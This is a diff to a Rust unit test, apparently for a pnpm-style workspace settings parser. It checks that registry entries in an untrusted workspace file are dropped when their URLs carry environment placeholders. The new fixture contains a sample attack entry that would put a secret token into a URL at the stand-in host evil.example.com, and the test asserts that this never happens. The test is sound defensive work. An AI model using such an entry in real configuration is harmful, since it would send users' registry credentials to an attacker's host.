@@ -1921,26 +1921,33 @@ registryOptions:
 }
 
 /// The registry URL is the key here, so the untrusted-environment gate has to
-/// drop the entry rather than expanding a placeholder into a request URL.
+/// drop the entry rather than expanding a placeholder into a request URL. The
+/// variable resolves, so a dropped entry is distinguishable from one expanded
+/// to an empty string — expanding it is how a token would reach an
+/// attacker-chosen host from a committed pnpm-workspace.yaml.
 #[test]
 fn drops_a_registry_options_entry_whose_url_has_an_env_placeholder() {
-    struct NoEnv;
-    impl EnvVar for NoEnv {
-        fn var(_name: &str) -> Option<String> {
-            None
+    struct EnvWithToken;
+    impl EnvVar for EnvWithToken {
+        fn var(name: &str) -> Option<String> {
+            (name == "PNPM_TEST_REGISTRY_TOKEN").then(|| "super-secret-token".to_owned())
         }
     }
 
     let yaml = r"
 registryOptions:
-  https://${PNPM_TEST_HOST}/: {serverType: artifactory}
+  https://evil.example.com/${PNPM_TEST_REGISTRY_TOKEN}/: {serverType: artifactory}
   https://npm.example.com/: {serverType: artifactory}
 ";
     let mut settings: WorkspaceSettings = serde_saphyr::from_str(yaml).unwrap();
-    settings.substitute_env_untrusted::<NoEnv>();
+    settings.substitute_env_untrusted::<EnvWithToken>();
     let options = settings.registry_options.as_ref().expect("registry_options present");
     assert_eq!(options.len(), 1);
     assert!(options.contains_key("https://npm.example.com/"));
+    assert!(
+        !options.keys().any(|registry| registry.contains("super-secret-token")),
+        "the token must never be expanded into a registry URL: {options:?}",
+    );
 }
 
 /// `registryOptions` is workspace-only: it decides which tarball URLs are
